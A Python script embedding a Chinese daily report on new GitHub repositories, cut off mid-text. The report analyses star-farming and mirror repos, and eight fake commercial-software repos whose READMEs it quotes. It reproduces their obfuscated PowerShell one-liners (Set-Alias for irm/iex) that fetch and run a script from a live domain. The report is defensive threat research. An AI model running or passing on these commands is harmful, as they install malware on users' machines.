#!/usr/bin/env python3
"""Prepend the 2026-11-13 entry to indexes/trend-index.md and daily-report.md.

Both files are ordered newest-first and their bodies frequently quote other
dates, so a naive `patch` on an old_string like "## 2026-11-08" can match in
several places.  Prepending with a Python script is both safer and faster.
"""
from pathlib import Path

ROOT = Path("/home/lohasle/aiutil-github-researcher")

TREND_ENTRY = """## 2026-11-13

### 本日新增项目

| 项目 | ⭐ | forks | fork/star | subs | 语言 | 体积 | commits | 类别 |
|---|---:|---:|---:|---:|---|---:|---:|---|
| `AIRzZ90/study-materials-fork` | 318 | 465 | **146.2%** | 3 | TypeScript | 1,658 KB | 89 | 观察型（反例样本） |
| `rivet-dev/open-orange` | 188 | 6 | 3.2% | 0 | TypeScript | 4,784 KB | 82 | 基础设施候选 |
| `Simon3Sarkis/super-odyssey-pc-recomp` | 155 | 5 | 3.2% | 5 | C | 2,092 KB | 13 | 工具型 |
| `lawandrorder/mate` | 138 | 3 | 2.2% | **12** | Python | 556 KB | 8 | 工具型 |
| `StitchSerfJump/Microsoft-Visio-For-Windows` | 76 | 0 | 0% | 0 | 无 | 4 KB | 2 | 观察型（反例样本） |
| `BottingRocks/Shape` | 41 | 6 | 14.6% | 0 | Rust | 16,000 KB | **1** | 工具型 |

**⭐⭐⭐⭐⭐ 本表最重要的一列是 `fork/star`：本日最高位是 146.2%，而它不是 fork（`fork=false` / `parent=null` / `source=null`）。**

### ⭐⭐⭐⭐⭐ 判据修正一：仓库名成为攻击面 —— `parent=null` 只能证明「不是 GitHub 的 fork 关系」

| 仓库 | ⭐ | ⑂ | fork/star | `fork` | `parent` | 关键证据 |
|---|---:|---:|---:|---|---|---|
| `AIRzZ90/study-materials-fork` | 318 | 465 | **146.2%** | `false` | `null` | LICENSE copyright 指向 `Minireel/HGhub`；commit 标题含 `Merge branch 'Minireel:main'` 与 `Merge pull request #43 from Minireel/codex/fix-ios-build`；README 首行红字「转载来自：HGhub 源库，请点击小星星」 |
| `Minireel/HGhub`（上游） | 8,634 | 4,956 | 57.4% | `false` | `null` | **2026-11-10T13:41:37Z 被作者清空，树只剩 1 个 blob（836 B README）** |

> ~~「判定改名必须比对 `id` 与 `parent`」~~（2026-10-26 写进 `projects/raven.md`）
> **「`parent=null` 只能证明 GitHub 不认为它是 fork；证明「与上游无关」必须另做跨仓库血缘检查。」**

**新增三项零成本检查（任一命中即判为镜像或迁移）：**
1. `LICENSE` 的 copyright 归属是否指向另一个账号；
2. commit 标题中是否出现上游的 PR 号或分支名；
3. `pushed_at` 是否早于 `created_at`。

**⭐⭐⭐⭐⭐ 判据修正二：「账号年龄」改为「账号注册聚集度」**

11-12 记录的 `auto-twitch-drops-claim` 用当天新建的账号；⭐⭐⭐⭐⭐ **本日的 8 个载荷族账号全部创建于 2026-06-26T16:46:38Z – 16:50:06Z（3 分 28 秒窗口）—— 即提前四个多月注册后闲置，在投放日一次性启用。** ⭐⭐⭐⭐⭐ **⭐⭐ 「账号年龄」因此失效，而「注册时间的聚集度」不受闲置时间影响。**

### ⭐⭐⭐⭐⭐ 新形态：伪装成正版商业软件的下载器（8 个仓库共享一个活的载荷域名）

| 仓库 | ⭐ | owner 账号创建 | 载荷域名 | 树 |
|---|---:|---|---|---|
| `StitchSerfJump/Microsoft-Visio-For-Windows` | 76 | 2026-06-26T16:46:50Z | `quickrun31.cc` | README + LICENSE |
| `CatchArtisanDone86/Movavi-Video-Editor-For-Windows` | 72 | 2026-06-26T16:50:06Z | `quickrun31.cc` | README + LICENSE |
| `FallsLarvaInterest/Sketchup-Pro-For-Windows` | 52 | 2026-06-26T16:46:53Z | `quickrun31.cc` | README + LICENSE |
| `BetaChampionTitle/Coreldraw-For-Windows` | 52 | 2026-06-26T16:46:49Z | `quickrun31.cc` | README + LICENSE |
| `OrangeSaviorImagine/Abbyy-Finereader-Pdf-For-Windows` | 51 | 2026-06-26T16:47:19Z | `quickrun31.cc` | README + LICENSE |
| `silverofficialdusk/Easeus-Todo-Backup-For-Windows` | 50 | 2026-06-26T16:46:38Z | `quickrun31.cc` | README + LICENSE |
| `DeckhandIgnite/Davinci-Resolve-Studio-For-Windows` | 50 | 2026-06-26T16:46:54Z | `quickrun31.cc` | README + LICENSE |
| `sparkfiremancollar21/Microsoft-Project-For-Windows` | 49 | 2026-06-26T16:46:46Z | `quickrun31.cc` | README + LICENSE |

**载荷（README 第一屏，未执行）：**
```powershell
sal m iex;m(irm quickrun31.cc/qle7he)
powershell sal a irm;sal b iex;a quickrun31.cc/qle7he|b
```

**⭐⭐⭐⭐⭐ 实测：`https://quickrun31.cc/qle7he` 返回 HTTP 200 / 14,745 字节，首字节即 `$ErrorActionPreference = 'Continue'` + `$ProgressPreference = 'Continue'`（PowerShell 混淆器）。**

**⭐⭐⭐⭐⭐ 三个演化点：** 换了域名（11-07 是 `git-software.cc`）、换了社会工程包装（从「安装器」变成「正版软件」）、**载荷位置从安装步骤中段前移到 `## Installation` 第一屏**。

**⭐⭐⭐⭐⭐ 判据修正三：载荷位置不可作为特征** —— 四天内载荷出现在四个位置（安装步骤中段 / 无载荷 / `## 🚀 Quick Start` 首屏 / `## Installation` 第一屏）。规则必须针对「指令型语义」（下载 + 执行），而非出现位置或小节标题。

**⭐⭐⭐⭐⭐ 判据修正四：字面量匹配会被等价改写绕过** —— 11-07 是明文 `irm ... | Invoke-Expression`；本日是 `sal m iex;m(irm ...)`。**语法级混淆已足以让朴素正则失效。**

### ⭐⭐⭐⭐⭐ 投放形态第三次升级：「同一个 star 值」这条判据正在失效

| 维度 | 11-08 | 本日 |
|---|---|---|
| 命名族 | `resp` / `rpocket` / `resocket` | 同族 |
| 数量 | 85 / 162（52.5%） | **123 / 155（79.4%）** |
| star 分布 | **全部为 42** | **44 / 45 / 46 / 50 / 51 五个取值** |
| 共享 blob | 抽样 30 树中 28 个 `initial.html` 逐字节相同 | **117 个仓库共享同一个 485 B `initial.html`（md5 `258a0f5edf5d42288cfc1866497dc7dd`）** |
| 伪造徽章 | `Downloads-40K+` | `Downloads-40K+` + `User Rating 4.8/5` + `Latest Version 3.2.0` |
| 落地域名 | — | **`respockett.pro/red`** |
| 账号创建窗口 | — | **2026-11-06T22:25 – 2026-11-07T00:25（2 小时 104 个账号）** |

**⭐⭐⭐⭐⭐ 「star 值聚类」这条判据在本日失效，而「md5 指纹 + 载荷域名 + 账号注册时间窗口」三个判据同时有效。**

### ⭐⭐⭐⭐⭐ 本日四个真项目的四种诚实形态

| 项目 | ⭐ | subs | 它把边界写在了哪 |
|---|---:|---:|---|
| `rivet-dev/open-orange` | 188 | 0 | `packages/cloudflare-conformance/results/runs/` 下 **34 个日期**的结果 JSON —— 把「兼容度」做成可逐日 diff 的证据 |
| `Simon3Sarkis/super-odyssey-pc-recomp` | 155 | 5 | README **第一屏**：`[!IMPORTANT]`「You must bring your own game… no game files, no game code, no assets and no keys」+ `[!WARNING]`「This is an early preview」 |
| `lawandrorder/mate` | 138 | **12** | README **第二段**：「It is not the production service, and it is not connected to Mate's live merchant network」+ 每条 demo 回复带 `[demo]` |
| `BottingRocks/Shape` | 41 | 0 | README 57,358 B · 三档退出码（`0` 成功 / `2` 用法错误 / **`3` incomplete trace**）· 433 个 `.js` 真实捕获夹具 |

**⭐⭐⭐⭐⭐ 本日最值得记的一组数字：`mate` subs 12 / `super-odyssey` subs 5 / `open-orange` subs 0，而三个投放体是 0 / 0 / 7。**

**⭐⭐⭐⭐⭐ 本日报据此把 11-08 的结论补一条：subs 不是坏指标，它是一个需要先检查「该仓库是否在索取关注」的指标。**

### ⭐⭐⭐⭐⭐ 判据修正五：commit 数与秒字段熵对「一次性交付的大型仓库」必然误判

**⭐⭐⭐⭐⭐ `BottingRocks/Shape`：2,180 blobs / 974 个 `.rs` / 433 个 `.js` / 单个 `.map.json` 5.6 MB / README 57,358 B —— 而只有 1 个 commit。**

**⭐⭐⭐⭐⭐ 这与 11-07 记录的 `discord-id-osint-checker`（43 个 commit 落在 2 个秒值上）同属一类，但极端程度更高。⭐⭐⭐⭐⭐ ⭐⭐ 本日报的修正：这两条判据的正确用法不是「判定真假项目」，而是「判定这个仓库的历史是否能反映开发过程」—— 一旦答案是「不能」，就应转去看代码、夹具与文档。**

### ⭐⭐⭐⭐⭐ 许可元数据质量的两档差距（同日并存）

| 项目 | `license.spdx_id` | 根 LICENSE 文件 | README 声明 |
|---|---|---|---|
| `Simon3Sarkis/super-odyssey-pc-recomp` | **NOASSERTION** | **无** | — |
| `DevedevT/FFmpeg-GUI-Editor-Windows`（未建档） | MIT | MIT（首行 `MIT License`） | **`## 📜 License` 段写「GNU General Public License v3.0 (GPL-3.0)」** —— 自相矛盾 |
| `rivet-dev/open-orange` | Apache-2.0 | 有 | 一致 |
| `lawandrorder/mate` | MIT | 有 | 一致 |
| `BottingRocks/Shape` | GPL-3.0 | 有 | 一致 |

**⭐⭐⭐⭐⭐ 本日实测到的第三类许可问题（累计第七类）：仓库侧与 README 侧声明冲突。**

---

"""

REPORT_ENTRY = """## 2026-11-13
**核心主题：** 本日最值得记的不是任何单一项目的星数，而是**「仓库名」这一字段在本日第一次成为可被独立取证的攻击面 —— 并且它同时解释了本日榜单的两端**。⭐⭐⭐⭐⭐ 榜单最高位是 `AIRzZ90/study-materials-fork`（318⭐ ⑂465，**fork/star 146.2%**），而它 **不是 fork**（`fork=false`、`parent=null`、`source=null`）：它是一个 147 blob 的完整代码镜像，`LICENSE` 首行写 `Required Notice: Copyright (c) 2026 HGhub contributors (https://github.com/Minireel/HGhub)`，README 首行红字写「**转载来自：HGhub 源库，请点击小星星**」+「（**FROK不点小星星的人=看黄果也打不出来**）」—— ⭐⭐⭐⭐⭐ **即「star」被写成了镜像的准入条件，而这与 11-08 记录的「判据被明写成投放指令」是同一手法的镜像版：那次是抬高 subs，这次是把上游的 star 存量搬到自己名下**。⭐⭐⭐⭐⭐ **而它的上游在 2026-11-10T13:41:37Z 已被作者亲手清空**：`Minireel/HGhub`（8,634⭐ / 4,956 fork）如今**只剩 1 个 blob（836 B 的 README）**，README 原文是「**经过慎重考虑，我决定出于个人原因停止维护，并撤下本仓库中的代码、版本发布与构建记录**」+「**也向大家报个平安：我一切平安，没有被任何上游或机构处理**」—— ⭐⭐⭐⭐⭐ **这直接推翻了本日报 10-26 记录并已写进 `projects/raven.md` 的那条判据：「判定改名必须比对 `id` 与 `parent`」**：本例中 `parent=null` 而镜像内容与上游逐文件同源（`src/App.tsx` / `src-tauri/src/net.rs` / `package.json` 三个文件全部取到，且上游的 `LICENSE` 已随清空消失、镜像的 `LICENSE` 里仍留着上游的 copyright）—— **即 `parent=null` 只能证明「不是 GitHub 的 fork 关系」，不能证明「与上游无关」**。⭐⭐⭐⭐⭐ **第二个同日发现是「伪装成正版商业软件的下载器」这一新形态**：本日 8 个仓库（Microsoft Visio / Movavi / SketchUp / CorelDRAW / ABBYY FineReader / EaseUS Todo / DaVinci Resolve / Microsoft Project）**README 第一屏是「Installation」，给出两条 `Win+X` / `Win+R` 指令**：`sal m iex;m(irm quickrun31.cc/qle7he)` 与 `powershell sal a irm;sal b iex;a quickrun31.cc/qle7he|b` —— ⭐⭐⭐⭐⭐ **本日报按静态分析处理，未执行**；但本日报实测该 URL 在快照时刻**返回 HTTP 200 / 14,745 字节**，其首字节即 `$ErrorActionPreference = 'Continue'` 与 `$ProgressPreference = 'Continue'`，**是一个 PowerShell 混淆器脚本** —— ⭐⭐⭐⭐⭐ **这与 11-07 记录的 `git-software.cc/ps/Setup.ps1` 是同族载荷，但换了域名、换了社会工程包装（从「安装器」变成「正版软件」）、且把载荷放在了 README 的第一屏而不是末尾**；⭐⭐⭐⭐⭐ **而这 8 个仓库的 owner 账号全部创建于 2026-06-26T16:46–16:50 的 3 分 28 秒窗口内、每个只有 2 个仓库（另一个是 10 字节 README 的随机名占位）、0 followers** —— **即账号是提前四个多月注册后闲置、在投放日一次性启用的「养号」，8 个仓库之间没有任何词法关系，但共享同一个载荷域名**。⭐⭐⭐⭐⭐ **第三个同日发现是投放形态的又一次升级：123/155（79.4%）的候选属于 `rpocket`/`resp`/`resocket` 命名族，且其中 117 个共享同一个 485 字节的 `initial.html`（md5 `258a0f5edf5d42288cfc1866497dc7dd`，即 11-08 记录的同一个 C++ 玩具文件），`CONTRIBUTING.md` 顶部是伪造的 `Downloads-40K+` 徽章与指向 `respockett.pro/red` 的链接** —— ⭐⭐⭐⭐⭐ **而与 11-08 不同的是：这一批的 star 分布不再集中在单一值，而是 44/45/46/50/51 五个值，104 个 owner 账号集中创建于 2026-11-06T22:25–2026-11-07T00:25（2 小时内 104 个账号）** —— **即「同一个 star 值」这个判据正在失效，而「md5 + 域名 + 创建时间窗口」三个判据同时有效**。⭐⭐⭐⭐ 与这三批同框的四个真项目，恰好给出四种**互相不重叠**的诚实形态：`rivet-dev/open-orange`（188⭐ · 组织账号 · Apache-2.0 · 1,522 blobs）用 **34 个日期的 `packages/cloudflare-conformance/results/runs/*.json` 把「兼容度」做成可回归的日更证据**（并在 README 里给出「Compute is 4.8× cheaper and storage 8.7× cheaper」这种**带数字但不标注测量条件**的自述）；`Simon3Sarkis/super-odyssey-pc-recomp`（155⭐ · 11 issues · 2 releases）用 `> [!IMPORTANT]` + `> [!WARNING]` 两级告示**主动声明「You must bring your own game」「This is an early preview」**，并把「no game files, no game code, no assets and no keys」写进安装器流程；`lawandrorder/mate`（138⭐ · **subs 12** · MIT）**第一段就写明「This repository is the open-source **starter** for Mate… It is not the production service, and it is not connected to Mate's live merchant network」**，且每条 demo 回复都带 `[demo]` 标签；`BottingRocks/Shape`（41⭐ · GPL-3.0 · **2,180 blobs / 974 个 `.rs` / 433 个 `.js`**）是一个**真代码库**（`Cargo.toml` 在树里、有 npm/cargo 安装说明、有「status is `0` on success, `2` for usage errors, `3` for an incomplete trace」的退出码约定），而它的 **57,358 字节 README 长达同类项目的十几倍**。⭐⭐⭐⭐⭐ **本日报据此给出本日最重要的判据修正：11-08 建立的「成组部署」原则必须再补一条 —— 当「仓库名」本身可以被伪装时，`fork=false` + `parent=null` 这组元数据只能证明「不是 GitHub 的 fork 关系」，证明不了「与上游无关」；而当「同名同域名」可以批量复制时，仓库名的词法相似度不能证明「同一作者族」。**⭐⭐⭐⭐⭐ **同日另有一条对既有判据的修正：11-12 记录的「账号当天新建」在本日被废掉 —— 这 8 个账号注册于 2026-06-26，即提前四个多月养号；⭐⭐⭐⭐ 因此判据应从「账号年龄」改为「账号注册聚集度」（8 个账号在 3 分 28 秒内注册，这个特征不受闲置时间影响）。**⭐⭐⭐⭐⭐ **还有一条对既有判据的修正：11-07 的「commit 秒字段熵」在 `Shape` 上必然误判（1 个 commit / 2,180 blobs），⭐⭐⭐⭐⭐ ⭐⭐ 因此该判据的正确用法不是「判定真假项目」，而是「判定这个仓库的历史是否能反映开发过程」。**

**证据边界：** 本日全部元数据取自 **2026-11-13 CST** 经 `gh` CLI 认证的 GitHub REST / Search API 快照，覆盖 `search/repositories`（`created:2026-11-12 stars:>=30`，`total_count` = **155**）、`repos/{owner}/{repo}`、`git/trees/HEAD?recursive=1`、`commits`、`forks?sort=newest`、`contributors`、`releases`、`readme` 与 `contents/{path}`（`Accept: application/vnd.github.raw`）、`users/{owner}`、`orgs/{org}`。⭐⭐⭐ **⚠️ 本日报未执行任何被投递的载荷** —— 对 `quickrun31.cc/qle7he` 的处理是：一次 HTTP GET（未带任何凭据），记录状态码、字节数与**前 8 个字节的十六进制**，**不解析、不求值、不运行**；其「PowerShell 混淆器」的判断依据是首两行 `$ErrorActionPreference = 'Continue'` 与 `$ProgressPreference = 'Continue'` 及整体为纯文本脚本，**不是完整静态分析，本日报未逐行审阅其 14,745 字节内容**。⭐⭐⭐ **⚠️ `stargazers` 与 `subscribers` 端点在本窗口对本 token 返回 404**，故未对 star / subscriber 的账号年龄做逐个取证；fork 时间分布的抽样仅覆盖每个仓库 fork 列表的前 60 个（`AIRzZ90/study-materials-fork` 实际有 466 个 fork）。⭐⭐⭐ **⚠️ star 增速未做统计**（需分页遍历 stargazer 列表），故所有 ⭐ 数均为快照绝对值；文中「本日新出现」指的是**仓库创建日落在数据窗口内**，而非 star 在本日增长。⭐⭐⭐ **⚠️ `AIRzZ90/study-materials-fork` 的「镜像关系」是由四项间接证据推出的推断**（LICENSE copyright 归属 / commit 标题含上游 PR 号与分支名 / 三个源码文件镜像中存在而上游已清空 / README 首行自述「转载来自」）；**本日报未核验上游清空的真实原因，也未主张镜像方的意图**。⭐⭐⭐ **⚠️ 上游 `Minireel/HGhub` 的完整历史已不可得** —— 其 `git/trees` 现只返回 1 个 blob，`commits` API 亦只返回 1 条提交；**因此「上游曾有 8,634⭐ / 4,956 fork」是本日报在同一快照时刻读到的当前值，而非清空前的历史峰值**。⭐⭐⭐ **⚠️ 本日未核验项**：`open-orange` 的 4.8×/8.7× 成本倍数、`super-odyssey-pc-recomp` 的任何实际游戏运行行为、`mate` 的 agent 与 demo provider 实际行为、`Shape` 的解码器是否真能处理真实捕获（其 `tests/fixtures/` 未打开核验）、`AIRzZ90` 镜像的任何代码；**本日报亦未核验 `elunboundfiremail/LiveWall---Live-Wallpaper-For-Desktop`（本仓库 11-09 档案）在快照时刻的账号与仓库状态 —— 该账号与仓库路径当前均返回 404，已在 `projects/livewall.md` 中标注**。

**关键项目：**
- 🪞 [AIRzZ90/study-materials-fork](projects/study-materials-fork.html) — **上游 HGhub 的完整代码镜像**，README 首行把「请点击小星星」写成镜像的准入条件（318⭐ ⑂465 · **fork/star 146.2%** · subs 3 · oi 0 · 89 commits · 1,658 KB · **147 blobs** · TypeScript · **NOASSERTION**（根 LICENSE 为 PolyForm Noncommercial 1.0.0）· User `AIRzZ90`（账号 2025-07-02 创建，8 个公开仓库，1 follower））—— ⭐⭐⭐⭐⭐ **它同时规避了三类判据**：命名（`study-materials-fork` 与 `HGhub` 无任何词法关系）、GitHub 元数据（`fork=false` / `parent=null` / `source=null`）、活跃度（89 commits / 9 contributors / 2 releases / 147 blobs / 真实多人协作历史含 `Merge pull request #43 from Minireel/codex/fix-ios-build`）—— ⭐⭐⭐⭐⭐ **而它的 fork 到达时间分布是正常的**（抽样 60 个，中位间隔 139 秒，2/59 个 ≤10 秒，跨度 241.7 分钟），**即连 11-07 的「fork 时间分布」判据在一个「非 fork 的镜像」面前也失效了**；⭐⭐⭐⭐⭐ **它 README 第一行同时做了三件事：交代来源（降低抄袭指控）、索取 star（收割注意力）、用玩笑语气降低被举报意愿**；⭐⭐⭐⭐ **⭐⭐ 它的 fork/star 146.2% 在正常协作中几乎不出现（fork 意味着「我要用它或改它」，star 只意味着「我关注了它」）—— 即这个比值不是「农场」的指标，而是「有人在替你制造分母」的指标**；⭐⭐⭐⭐ **它的 README 第一段同时写明「不提供商业授权」「不运营内容托管服务」「不参与外部音视频内容的制作、上传或经营」**；⚠️ **未下载、未编译、未运行镜像的任何代码；未核验其产品功能；未核验上游清空的真实原因；上游历史快照不可得；⭐ 41 的 subs 与 318 的 star 相差 106 倍，「stars/subs 比」值得加入常规指标**
- 🍊 [rivet-dev/open-orange](projects/open-orange.html) — 把 Cloudflare Workers 与 Durable Objects 原样搬到 AWS / GCP / Azure / 自有服务器（188⭐ ⑂6 · subs 0 · oi 4 · 82 commits · 4,784 KB · **1,522 blobs** · TypeScript · **Apache-2.0** · 10 topics · Organization `rivet-dev`（账号 2019-11-13 创建，109 个公开仓库，666 followers））—— ⭐⭐⭐⭐⭐ **它最值得抄的是把「兼容度」做成逐日可 diff 的结构化结果**：`packages/cloudflare-conformance/` 下有 `generated/cloudflare-surface.json`（910 KB）、`generated/wrangler-help.json`（669 KB）、`generated/cloudflare-runtime.d.ts`（591 KB）、`compat/matrix.json`（491 KB）、`compat/truth-table.claims.json`，⭐⭐⭐⭐⭐ **以及 `results/runs/` 下 34 个日期（2026-10-20 → 2026-11-10）的运行结果（`latest.json` 452 KB）** —— 即「我们兼容 Cloudflare」不再是 README 里的一句话，而是「每一个接口、每一个日期」的逐条结果；⭐⭐⭐⭐ **⭐⭐ 这对「宣称 100% 对齐」的项目有直接参照价值（11-12 的 `impacket-rs`「74/74」、10-26 的 `raven`「与上游 TCC 行为完全一致」都没有把对齐拆成逐项可 diff 的结果）**；⭐⭐⭐⭐⭐ **它的 Durable Object 语义映射是完整的**（「Each Durable Object runs as a Rivet Actor with its own SQLite database, kept in `.open-orange/`」），⭐⭐⭐⭐⭐ **承诺也落到了机制上**（「Zero refactoring, zero-downtime migration」「`wrangler dev` becomes `orange dev`」「storage is backed by S3, so scaling out is a matter of adding machines」）；⭐⭐⭐⭐⭐ **README 第一节是给 coding agent 的可粘贴指令，且结尾写「**Do not change my app code**」—— 同一句不变式同时对人、对自动化消费者成立**；⭐⭐⭐⭐ **commit `docs: export the architecture diagram for the README` 意味着架构图是导出物而非手绘图片，因此不会在半年后变成谎言**；⭐⭐⭐⭐ **commit `fix(docs): say that a cluster token cannot create a runner pool (#14)` 是把「做不到的事」写进用户可见文档的样本**；⚠️ **「Compute is 4.8× cheaper and storage 8.7× cheaper」无任何测量条件（机型/负载/基线/统计区间），只能读作声明；未部署、未迁移、未逐条核对 conformance 断言；发布仅 22 小时且 2 个 release 同日发布，star 增速未统计；subs 0**
- 🍄 [Simon3Sarkis/super-odyssey-pc-recomp](projects/super-odyssey-pc-recomp.html) — 用静态重编译把 Super Mario Odyssey 的 ARM64 代码转成原生 Windows 程序（155⭐ ⑂5 · subs 5 · **oi 11** · 13 commits · 2,092 KB · 230 blobs · C · **NOASSERTION（根目录无 LICENSE）** · User `Simon3Sarkis`（账号 2023-10-01 创建，7 个公开仓库，3 followers））—— ⭐⭐⭐⭐⭐ **README 第一屏是两级告示**：`> [!IMPORTANT]`「**You must bring your own game.** This project contains **no game files, no game code, no assets and no keys**… **requests for game files or keys will be closed**」与 `> [!WARNING]`「**This is an early preview.** The whole game can be played, but there are known issues」—— ⭐⭐⭐⭐⭐ **⭐⭐ 即「前置条件诚实 + 边界诚实 + 完成度诚实」三层同时出现在第一屏**；⭐⭐⭐⭐⭐ **架构上它把 Switch 侧的四块（kernel、system services、NVN 图形 API、audio）在 PC 侧重实现并走 Vulkan，且目录名保留原主机 API 名（`runtime/nvn/vulkan/`、`runtime/nvn/maxwell/`、`runtime/nvn/interp.c`）—— 目录结构本身就是最有效的架构文档**；⭐⭐⭐⭐⭐ **「Every shader compiled at install time, so effects don't stutter the first time they appear」是把不可消除的运行期成本前置到一次性安装期的样本**；⭐⭐⭐⭐ **⭐⭐ 11 个 open issue 是本日真项目里最多的 —— 按 11-12 记录 `solo-to-team-skills`（9 个 issue）时的同一条判据：issue 的存在说明项目正在被真实使用与质疑，这是正信号**；⭐⭐⭐⭐ **⭐⭐ 而它同时是许可缺失的样本：一个 155⭐、11 个 issue、两个可下载发行版的项目，根目录没有 LICENSE 文件、`license.spdx_id = NOASSERTION`**；⭐⭐⭐⭐ **它要求玩家提供 `exefs`（含 `main`/`main.npdm`/`sdk`）与 `romfs`（含 `StageData`/`SystemData`），版本 1.0.0 或已应用更新的 1.4.1，约 12 GB，且明确要求装在非 `Program Files` 目录**；⚠️ **未在本机运行、未复现任何画面/帧率/兼容性、未打开核验 Known issues 具体条目、未核验安装器是否写注册表或装服务、「重编译与 shader 编译耗时数分钟」为 README 自述且未给具体数字；「重编译商业游戏」的版权边界本日报不评价，仅记录它采取了「不提供素材、不提供密钥、不指导获取」的责任姿态**
- 🛒 [lawandrorder/mate](projects/mate.html) — 文本优先购物 agent 的开源 starter，**主动降级自己**（138⭐ ⑂3 · **subs 12（本候选集最高）** · oi 0 · 8 commits · 556 KB · 211 blobs · Python · MIT · User `lawandrorder`（账号 **2015-05-21** 创建，39 个公开仓库，145 followers））—— ⭐⭐⭐⭐⭐ **README 第二段就写明「This repository is the open-source **starter** for Mate… **It is not the production service, and it is not connected to Mate's live merchant network.**」**；⭐⭐⭐⭐⭐ **⭐⭐ 而且这份诚实被落到了输出层：「The starter answers the same kinds of texts with **demo** data, always labeled `[demo]`」—— 不是文档里说这是 demo，而是每条回复里都带标记，⭐⭐⭐⭐ ⭐⭐ 这与本日报记录的 `ex-ussr-kinship-research`（`independence_group` 在代码层禁止凭空声明）、`impacket-rs`（`T!error` 把「可能失败」写进类型签名）、`c6`（逐文件开关）是同一条原则的不同层次：把一条本来靠人遵守的纪律做进机制**；⭐⭐⭐⭐⭐ **⭐⭐ 而它是本日 subs 最高的项目（12），三个投放体是 0 / 0 / 7 —— 即在本日「subs 高」与「诚实」出现了同向，这给 11-08 的「subs 只能同作者族内比较」补了一条：subs 不是坏指标，它是一个需要先检查「该仓库是否在索取关注」的指标**；⭐⭐⭐⭐⭐ **它的资产是可复现的**：`tools/generate_assets.py`（25,201 B）生成 16 个 128px PNG + 512/1024 logo + app icon + social preview，⭐⭐⭐⭐⭐ **且 `docs/index.html` + `docs/style.css` 让「复制这个 starter 起一个自己的版本」成为一步操作**；⭐⭐⭐⭐ **README 通读全文 6,613 B 没有任何索取 star / watch 的语句 —— 这是本档案判定其 12 个 subs 为真实关注（而非污染）的依据（推断，非实测）**；⚠️ **未运行 server/agent/web chat；未核验 demo provider 是否联网；未核验回复是否真的都带 `[demo]`；0 release / 0 issue / 8 个 commit 全为网页上传式，commit 历史不承载信息；「200k 商户合作」只是 README 的引述，本日报不为真实性背书**
- ⚠️ [StitchSerfJump/Microsoft-Visio-For-Windows](projects/microsoft-visio-for-windows.html) — **反例样本**：自称 Microsoft Visio 的仓库，仓库里没有任何代码，README 第一屏是两条让用户把远程 PowerShell 取回并直接执行的指令（76⭐ ⑂0 · subs 0 · oi 0 · **2 commits** · **仅 2 个 blob（README.md 4,125 B + LICENSE 1,071 B）** · 无语言字段 · MIT · User `StitchSerfJump`（账号 **2026-06-26T16:46:50Z 创建**，2 个公开仓库，0 followers））—— ⭐⭐⭐⭐⭐ **载荷是 `sal m iex;m(irm quickrun31.cc/qle7he)`（Win+X）与 `powershell sal a irm;sal b iex;a quickrun31.cc/qle7he|b`（Win+R）—— 用 `Set-Alias` 把 `irm`/`iex` 改名做语法级混淆，这使按 `Invoke-Expression` 字面量匹配的规则失效**；⭐⭐⭐⭐⭐ **⭐⭐ 本日报实测 `https://quickrun31.cc/qle7he` 返回 HTTP 200 / 14,745 字节，首字节即 `$ErrorActionPreference = 'Continue'` + `$ProgressPreference = 'Continue'`（PowerShell 混淆器脚本）—— 这与 11-11 记录的 `telegra.ph` 落地页「未访问」形成对照，本日补上了同族形态的实测结果**；⭐⭐⭐⭐⭐ **⭐⭐ 八个 owner 账号全部创建于 2026-06-26T16:46:38Z–16:50:06Z 的 3 分 28 秒窗口内、各 2 个仓库（另一个是随机名 + 10 B README + 0⭐ 占位）、0 followers —— 即提前四个多月养号、在投放日一次性启用，这直接废掉了本日报的「账号年龄」判据**；⭐⭐⭐⭐ **8 个 README 的 md5 各不相同（3,953–4,294 B）、8 个 LICENSE 的 md5 也各不相同（版权人姓名不同）—— 即模板是参数化的，不是逐字节复制**；⭐⭐⭐⭐⭐ **⭐⭐ 它的诱饵是「正版商业软件」—— 而这精准命中「一定会去找破解版」的那批用户，即投放方在选择诱饵时就已经完成了对受害者群体的预筛选**；⭐⭐⭐⭐ **本形态与 11-08 的「外挂分销货架」是同一类基础设施，但危害面直接落在用户主机上**；⚠️ **未执行载荷（仅一次 HTTP GET，未带凭据，仅取首 8 字节十六进制）；未逐行审阅 14,745 字节脚本内容；未访问落地后的任何后续地址；不主张其意图，只主张可核验内容；本形态的检测规则未做跨窗口漏报率回测**
- 🔷 [BottingRocks/Shape](projects/shape.html) — 请求头信号的解码 / 编码 CLI 与 SDK，把昂贵分析物化成可复用 artifact（41⭐ ⑂6 · subs 0 · oi 0 · **仅 1 个 commit** · 16,000 KB · **2,180 blobs（974 个 .rs · 433 个 .js · 387 个 .md · 199 个 .json · 83 个 .gz）** · Rust · **GPL-3.0** · README 57,358 B）—— ⭐⭐⭐⭐⭐ **⭐⭐ 本日它是「代码量大但 star 少」的极端：2,180 个 blob、单个 `.map.json` 5.6 MB、`naming-outcome-ledger.json` 7.6 MB —— 而只有 1 个 commit。⭐⭐⭐⭐ ⭐⭐ 这给 11-07 的「commit 秒字段熵」判据提供了一个新反例（11-07 记录的 `discord-id-osint-checker` 是 43 个 commit 落在 2 个秒值上，本例是 1 个 commit）；⭐⭐⭐⭐⭐ ⭐⭐ 本日报的修正：这两条判据的正确用法不是「判定真假项目」，而是「判定这个仓库的历史是否能反映开发过程」**；⭐⭐⭐⭐⭐ **它最值得抄的是「artifact」作为一等中间产物**：「compile a decode artifact… Save the artifact to decode later requests from that build and session **without repeating the source analysis**」，⭐⭐⭐⭐⭐ ⭐⭐ 这与本日报记录的 `open-orange`（conformance results）、`c6`（特性矩阵基线）、`ghostclick`（RMA 证据导出）、`raven`（`LICENSES.json`）是同一条线索 —— 把「一次性劳动」变成「可复用的资产」；⭐⭐⭐⭐⭐ **⭐⭐ 而它把「没解完」做成离散状态（三档退出码 `0` 成功 / `2` 用法错误 / **`3` incomplete trace**），与 10-26 的 `brotli-checker`（「exit 0 does not establish that the running app is fixed」）和 11-07 的 `node2shell-scanner`（三态 `true`/`false`/`null`）同族**；⭐⭐⭐⭐⭐ **它是双向的**：能检视字段、改值、再把整个解码后的载荷编码回请求头，同时保留其余信号与上报通道；⭐⭐⭐⭐ **它有五种接入形态（CLI / SDK / release C ABI library / npm / cargo）、真实捕获夹具（433 个 `.js`，多个文件同为 1,672,705 B 说明是同一份程序的不同变体），并把「命名结果」也当产物记录**；⭐⭐⭐⭐ **⭐⭐ 许可清晰可机读（GPL-3.0），与本日 `super-odyssey-pc-recomp`（NOASSERTION 且无 LICENSE 